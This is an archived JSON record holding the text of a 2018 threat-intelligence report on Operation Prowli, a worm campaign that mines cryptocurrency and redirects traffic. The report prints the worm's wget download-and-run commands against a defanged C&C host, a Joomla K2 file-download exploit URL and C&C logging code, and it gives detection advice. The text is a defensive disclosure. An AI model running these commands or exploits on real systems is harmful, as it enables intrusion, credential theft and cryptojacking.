{
    "id": "505ac034-7c9f-4fe7-b4e0-b1b0885685b4",
    "created_at": "2023-01-12T15:02:08.405456Z",
    "updated_at": "2025-03-27T02:13:49.522835Z",
    "deleted_at": null,
    "sha1_hash": "b45daa9ffe7ef840c47797c67ce16ffd87babd35",
    "title": "2018-06-06 - Operation Prowli- Monetizing 40,000 Victim Machines",
    "authors": "",
    "file_creation_date": "2022-05-28T01:55:07Z",
    "file_modification_date": "2022-05-28T01:55:07Z",
    "file_size": 991059,
    "plain_text": "# Operation Prowli: Monetizing 40,000 Victim Machines\n\n**[guardicore.com/2018/06/operation-prowli-traffic-manipulation-cryptocurrency-mining/](https://www.guardicore.com/2018/06/operation-prowli-traffic-manipulation-cryptocurrency-mining/)**\n\nGuardicore Labs team has uncovered a traffic manipulation and cryptocurrency mining\ncampaign infecting a wide number of organizations in industries such as finance, education\nand government. This campaign, dubbed Operation Prowli, spreads malware and malicious\n\n\n-----\n\ncode to servers and websites and has compromised more than 40,000 machines in multiple\nareas of the world. Prowli uses various attack techniques including exploits, password bruteforcing and weak configurations.\n\nThis multi-purpose operation targets a variety of platforms – CMS servers hosting popular\nwebsites, backup servers running HP Data Protector, DSL modems and IoT devices. Victim\nmachines are monetized using a variety of methods, relying on internet trends such as digital\ncurrencies and traffic redirection. Traffic monetisation frauds are quite common and are\nbased on redirecting website visitors from their legitimate destination to websites advertising\nmalicious browser extensions, tech support scam services, fake services and more.\n\nWe uncover the entire Prowli operation, all the way from the unaware user visiting an\ninfected website through the traffic monetizer to the scam operator. In this report, we focus\non the attackers’ techniques, methodologies, infrastructure and goals. We will dive into the\ntechnical details and the way the money flows. A list of indicators of compromise (IOCs)\nrelated to the operation is provided at the end of the post.\n\n## Discovering the r2r2 worm\n\nOn the 4th of April, the Guardicore Global Sensor Network (GGSN) reported a group of SSH\nattacks communicating with a C&C server. The attacks all behaved in the same fashion,\ncommunicating with the same C&C server to download a number of attack tools named r2r2\nalong with a cryptocurrency miner.\n\n_Some of the attackers’ steps as recorded by GGSN_\n\nWhat caught our attention and made us look deeper into this operation was:\n\nWe traced this campaign across several networks in different countries, associated with\ndifferent industries\nThe attackers were using unfamiliar tools new to the the Guardicore Reputation\nrepository as well as other known datasets such as VirusTotal\nThe attackers used binaries with the same domain name hardcoded in the code and\neach of the binaries was designed to attack different services and CPU architectures\n\n\n-----\n\nOver a period of 3 weeks, we captured dozens of such attacks per day coming from over 180\nIPs from a variety of countries and organizations. These attacks led us to investigate the\nattackers’ infrastructure and discover a wide ranging operation attacking multiple services.\n\n## Scope\n\nWe found that the attackers store a large collection of victim machines with IP addresses and\ndomains that expose different services to the Internet. These services are all either\nvulnerable to remote pre-authentication attacks or allow the attackers to bruteforce their way\ninside. The list of targeted services includes Drupal CMS websites, WordPress sites, DSL\nmodems, servers with an open SSH port, vulnerable IoT devices, servers exposing HP Data\nProtector software and more.\n\n_Most of the victims ran with weak SSH credentials_\n\nThe attackers behind Operation Prowli assaulted organizations of all types and sizes which\n[is in line with previous attacks we investigated.](https://www.guardicore.com/2017/05/the-bondnet-army/)\n\n\n-----\n\n_Operation Prowli’s victims_\n\nOperation Prowli has compromised a wide range of services, without targeting a specific\nsector.\n\n_Victims by Industry_\n\n## Monetization: How does the money flow?\n\n\n-----\n\nThe attackers behind Operation Prowli are focused on making money from their efforts rather\nthan ideology or espionage. We currently understand two key flows of revenue in this\noperation.\n\nThe first source of revenue comes from cryptocurrency mining. Typically, cryptocurrency\nmining is considered a resource-heavy operation that involves a large upfront investment\nfollowed by ongoing traffic and energy costs. The attackers behind Prowli incur no expenses\nwhen they use r2r2 to take over computers owned by others and use mining pools to launder\ntheir gains. Cryptocurrency is a common payload of modern worms, and in this case as in\nmany others, our attackers prefer to mine Monero, a cryptocurrency focused on privacy and\nanonymity to a greater degree than Bitcoin.\n\nSecond source of revenue is traffic monetization fraud. Traffic monetizers, such as roi777,\nbuy traffic from “website operators” such as the Prowli attackers and redirect it to domains on\ndemand. Website “operators” earn money per traffic sent through roi777. The destination\ndomains frequently host different scams, such as fake services, malicious browser\nextensions and more.\n\n\n-----\n\n_An example of a fake website visitors are redirected to_\n\nThis is a dirty business and typically, all three sides, buyers and sellers of traffic and the\nmiddlemen, engaging in illicit activity. In our case, Prowli sells traffic by redirecting visitors\nfrom compromised legitimate websites to domains hosting tech support scams, fake browser\nextensions, scam products and more. The traffic monetizer working with the Prowli operation\n[was previously investigated by an anonymous researcher, who was able to connect it to SEO](https://malware.dontneedcoffee.com/hosted/anonymous/kotd.html)\nfraud and tech support scams. Later, another anonymous researcher hacked\n[the roi777 website and uploaded the](https://pastebin.com/96N1bg72) [raw](https://pastebin.com/tni7FZJ3) [data](https://pastebin.com/Y8eyA4Mq) [to](https://pastebin.com/SZ3VXJ7W) [Pastebin. The dump contains raw SQL](https://pastebin.com/hkhRi8GB)\ntables that appear to come from the “legitimate” part of the website, listing users, bitcoin\nwallet addresses, telegram IDs etc, providing a dataset of who is using the traffic redirection\nservice.\n\n## What’s Under Attack?\n\nOperation Prowli operators maintain a toolbox with a variety of attack methods to fit their\nneeds. We’ve seen different types of attacks, each based on a different service. Some\nattacks are based on worms that randomly attack IPs in the internet, while others targeting\nCMS servers use a master list of targets.\n\nA partial list of the attack vectors we’ve seen include:\n\nMachines running SSH are hacked by a self propagating worm spread by brute force\ncredential guessing, the victims download and run a cryptocurrency miner.\n[Joomla! Servers running the K2 extension are attacked with file download vulnerability,](https://extensions.joomla.org/extension/k2/)\nusing a URL such as\n\n\n-----\n\n_https://.com/index.php?option=com_k2&view=media&task=connector&cmd=file&target=_\n\n_[base64 of file path]&download=1_\n\nThis provides the attackers sensitive server configuration data such as passwords and API\nkeys.\n\n_Joomla! Configuration details_\n\nA variety of DSL modems are hacked by accessing their internet facing configuration\npanel using a URL such as https://:7547/UD/act?1 and passing in parameters\n[exploiting a known vulnerability. The vulnerability resides in the processing of SOAP](https://blog.rapid7.com/2016/11/29/on-the-recent-dsl-modem-vulnerabilities/)\ndata and allows remote code execution. This vulnerability was previously used by\nthe [Mirai worm.](https://isc.sans.edu/forums/diary/Port+7547+SOAP+Remote+Code+Execution+Attack+Against+DSL+Modems/21759)\nWordPress servers are hacked by a variety of infectors – some attempt to brute force\nlogin into the WP administrative panel, others exploit old vulnerabilities in WordPress\ninstallations. A third type of attacks searches for servers with configuration problems,\nsuch as exposing FTP credentials when accessing https://.com/wp-config.php~.\nServers running HP Data Protector exposed to the internet (over port 5555) are\n[exploited using a 4 year old vulnerability – CVE-2014-2623 used to execute commands](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-2623)\nwith system privileges.\n\nThe attackers also target systems with Drupal, PhpMyAdmin installations, NFS boxes and\nservers with exposed SMB ports open to brute force credential guessing.\n\n\n-----\n\nAn additional type of victims are compromised servers which host a well known open source\n[webshell named “WSO Web Shell”.](https://scottlinux.com/2013/04/06/wso-web-shell-php-shell-used-by-hackers/)\n\n_Complete control of infected machines_\n\nThese php-based shells provide access and remote code execution on different\ncompromised machines, frequently running vulnerable versions of WordPress.\n\n_Easy for the attacker to use the machines for further attacks_\n\nWe believe that these webshells are used by the attackers as pivot points. They provide a\nreliable platform to run scanning and attack scripts.\n\n## Bruteforce for the win\n\nLet’s take a closer look at the brute force SSH attack that tipped us off to this operation. The\nbinary named r2r2 is written in [Golang. A quick look showed that r2r2 randomly generates IP](https://golang.org/)\naddress blocks and iteratively tries to brute force SSH logins with a user/password dictionary.\n\nOnce it breaks in, it runs a series of commands on the victim. These commands run wget to\ndownload files from a hard coded server:\n\n\n-----\n\nMultiple copies of the worm for different CPU architectures\nA cryptocurrency miner and configuration file\n\n_The worm runs commands on remote victims and then reports credentials to a C2 server_\n\n\n-----\n\nThe commands used were:\n```\ncd /tmp;wget -O r2r2 h[]://wp.startreceive.tk/tdest/z/r2r2;chmod 777 r2r2;./r2r2 >\n/dev/null 2>&1 &\ncd /tmp;wget -O r2r2-a h[]://wp.startreceive.tk/test/z/r2r2-a;chmod 777 r2r2a;./r2r2-a > /dev/null 2>&1 &\ncd /tmp;wget -O r2r2-m h[]://wp.startreceive.tk/test/z/r2r2-m;chmod 777 r2r2m;./r2r2-m > /dev/null 2>&1\ncd /tmp;wget -O xm111 h[]://wp.startreceive.tk/test/z/xm111;chmod 777 xm111;wget -O\nconfig.json h[]://wp.startreceive.tk/test/z/config.json;chmod 777 config.json;./xm111\n> /dev/null 2>&1\n\n```\nThe different versions of the r2r2 binary, r2r2, r2r2-a and r2r2-m are the same binary\ncompiled for different platforms, x86, ARM and MIPS respectively.\n\n_From the binary we also extracted strings helping us name the attackers_\n\nAfter breaking into the server, the credentials used to login to the victim are transmitted over\nplaintext HTTP to wp.startreceive[.]tk/test/p.php and logged in the attackers server. Some\nversions of the worm send more details about the victims such as CPU, kernel dist version,\netc.\n\n## Joomla!.tk C&C\n\nThe attackers’ attack tools report to a C&C server running under the domain\nname wp.startreceive[.]tk. This [Joomla! server is a compromised server, which the attackers](https://www.joomla.org/)\nreuse to track their malware, collect information from the ever growing victims list and also\nserve different payloads to compromised machines.\n\nThe C&C logic is implemented by a group of PHP files who receive data on victims from the\nrelevant infectors and store the details. The victims are catalogued by exploitation method\nwith all the details needed to allow the attackers to access them again at any given time.\n\n\n-----\n\n```\nif ( isset ($_GET[ p ])) {\n$myfile = file_put_contents( ‘ip2_log.txt’, $ip. “||” .$_GET[ ‘p’ ].PHP_EOL,\nFILE_APPEND | LOCK_EX);\n}\nelseif ( isset ($_GET[‘p1’])){\n$myfile = file_put_contents( ‘ip3_log.txt’, $ip. “||” .$_GET[ ‘p1’ ].PHP_EOL,\nFILE_APPEND | LOCK_EX);\n}\nelse {\nif ( isset ($_GET[ ‘p2’ ])){\n$myfile = file_put_contents( ‘ip4_log.txt’, $ip. “||” .$_GET[ ‘p2’ ].PHP_EOL,\nFILE_APPEND | LOCK_EX);\n}\n}\nif ( isset ($_GET[ ‘t1’ ])) {\n$myfile = file_put_contents( ‘mhcl_log.txt’, $ip.PHP_EOL, FILE_APPEND | LOCK_EX);\n}\nif ( isset ($_GET[ ‘t2’ ])) {\n$myfile = file_put_contents( ‘dru_log.txt’, $_GET[ ‘t2’ ].PHP_EOL, FILE_APPEND |\nLOCK_EX);\n}\n\n```\n_A snippet from the attackers C&C code_\n\nFor every targeted service, victim data is stored in a log file with all the data the attacker\nneeds to regain access to the machine. For example:\n\nWordPress administration panel – Login credentials\nSSH – Login credentials\nJoomla! – URL exposing Joomla! configuration file\nWordPress databases – user, password, db name and mysql ip/domain\nWordPress weak configuration – URL exposing FTP credentials\n[DSL modems – URL exposing vulnerable configuration panels](https://blog.rapid7.com/2016/11/29/on-the-recent-dsl-modem-vulnerabilities/)\n[Webshell – A URL hosting “WSO Web Shell” and credentials](https://scottlinux.com/2013/04/06/wso-web-shell-php-shell-used-by-hackers/)\n\n_A snippet from a log file detailing accessible WordPress MySQL databases_\n\n## Show me the payload\n\nThe attackers behind Operation Prowli use different payloads for each of their targets. The\nSSH brute force attack provides the attackers with complete control of the system and are\nused to mine cryptocurrency, while breached websites are used to run different Web frauds.\nOther victims are picked by the attackers to execute more attacks, similar to how the server\nbehind wp.startreceive[.]tk was used as a C&C server.\n\n\n-----\n\nA significant part of this operation infects websites that run vulnerable CMS software. In\nsome cases, the payload is a PHP file that infects the website and injects code into different\nPHP pages and JavaScript files.\n\n_Part of a PHP file executed on a vulnerable server_\n\nThe PHP injector function php_in checks whether the targeted PHP file outputs HTML and if\nit does, injects a snippet of JavaScript code into the generated page. This snippet starts a\nprocess that ends with innocent website visitors redirected to a malicious website.\n\n\n-----\n\n_The Prowli attackers intermediate between infected websites and roi777_\n\nThe injected code loads another JavaScript snippet from stats.startreceive[.]tk/script.js that in\nturn, requests a URL from an obfuscated server side PHP\nfile stats.startreceive[.]tk/send.php and redirects the visitor to the provided URL. We believe\nthat the send.php page belongs to roi777 and is being used by Prowli as the integration point\nbetween roi777’s infrastructure and “website operators”. To make sure roi777 doesn’t track\n\n\n-----\n\nthe list of websites controlled by Prowli operators, the Prowli code injector script uses a\nredirect website (stats.startreceive[.]tk) on which the send.php page is hosted rather than\ninjecting the code into infected websites.\n\n_Before and after the redirector script is deobfuscated_\n\nThe send.php page retrieves the target domain name to which the victim is later redirected to\nfrom roi777[.]com. This website provides randomly chosen domains, all redirecting to\ndifferent websites of different types. The attackers append a unique id number to a target\ndomain, allowing roi777 to keep track of who is redirecting traffic.\n\n_An example of a tech support scam visitors are redirected to_\n\n\n-----\n\nTo sum it up, Prowli takes over legitimate websites and turns them, without their knowing,\ninto redirectors of traffic towards malicious websites, some of which are simple scams, others\nreference tech support scams.\n\n## Detection & Prevention\n\nThe attacks are based on a mix of known vulnerabilities and credential guessing. This means\nprevention should consist of using strong passwords and keeping software up to date. While\n“patch your servers and use strong passwords” may sound trivial we know that “in real life”\nthings are much more complicated. Alternatives include locking down systems and\nsegmenting vulnerable or hard to secure systems, to separate them from the rest of your\nnetwork.\n\nFor CMS software, if routine patching or external hosting is not a solution, assume at some\npoint it will be hacked and follow strict hardening guides. The major CMS\nvendors [WordPress and Drupal provide hardening guides. For example, a locked down](https://wordpress.org/support/article/hardening-wordpress/)\nWordPress installation would have prevented attackers from modifying files with their\ninjected code. For general purpose PHP websites, OWASP provides a hardened PHP\nconfiguration.\n\nSegmentation is a good practice and since you can’t always prevent the breach, you should\nsegment and monitor your network to minimise harm and avoid infamous breaches such as\nthe [fish tank breach. Routinely review who and what can access the servers. Keep this list to](https://thehackernews.com/2018/04/iot-hacking-thermometer.html)\na minimum and pay special attention to IoT devices whose credentials cannot be changed.\nMonitoring connections would easily show compromised devices communicating with\ncryptocurrency mining pools.\n\n**R2R2 infected machines**\n\nIf you have an infected machine with r2r2, stopping the worm & miner processes\n(r2r2 and xm11) and deleting the files will suffice to clean up the attack. Don’t forget to\nchange passwords after the cleanup. You can detect these machines by looking for high\nCPU usage or an abnormal amount of outgoing SSH connections to unknown IPs.\n\n**Detect visitors of Prowli infected websites**\n\nDiscovering if any of the computers in your network has visited an infected website can be\ndone by examining network traffic and searching for traffic to wp.startreceive[.]tk and\nstats.startreceive[.]tk. Machines that tried to resolve one of these domains, have previously\nvisited an infected website. We advise you to make sure users have not installed any\nmalicious software or were exploited by common browser vulnerabilities. Also, it might be\nworth to search for domains ending in .tk. While there are legitimate web sites under that\n[gTLD, according to this research, phishing domains are incredibly common under this](https://docs.apwg.org/reports/APWG_Global_Phishing_Report_2015-2016.pdf)\nregister.\n\n\n-----\n\n**Detect compromised CMS servers**\n\nTo check if a website is compromised, search the code files (PHP and JS files) for the\nfollowing snippet:\n\nJavaScript files:\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-06-06 - Operation Prowli- Monetizing 40,000 Victim Machines.pdf"
    ],
    "report_names": [
        "2018-06-06 - Operation Prowli- Monetizing 40,000 Victim Machines.pdf"
    ],
    "threat_actors": [
        {
            "id": "f6306e79-ce51-4c00-a185-117c5cc18300",
            "created_at": "2024-06-19T02:00:04.380042Z",
            "updated_at": "2025-03-27T02:00:03.384472Z",
            "deleted_at": null,
            "main_name": "Bondnet",
            "aliases": [],
            "source_name": "MISPGALAXY:Bondnet",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535728,
    "ts_updated_at": 1743041629,
    "ts_creation_date": 1653702907,
    "ts_modification_date": 1653702907,
    "files": {
        "pdf": "https://archive.orkl.eu/b45daa9ffe7ef840c47797c67ce16ffd87babd35.pdf",
        "text": "https://archive.orkl.eu/b45daa9ffe7ef840c47797c67ce16ffd87babd35.txt",
        "img": "https://archive.orkl.eu/b45daa9ffe7ef840c47797c67ce16ffd87babd35.jpg"
    }
}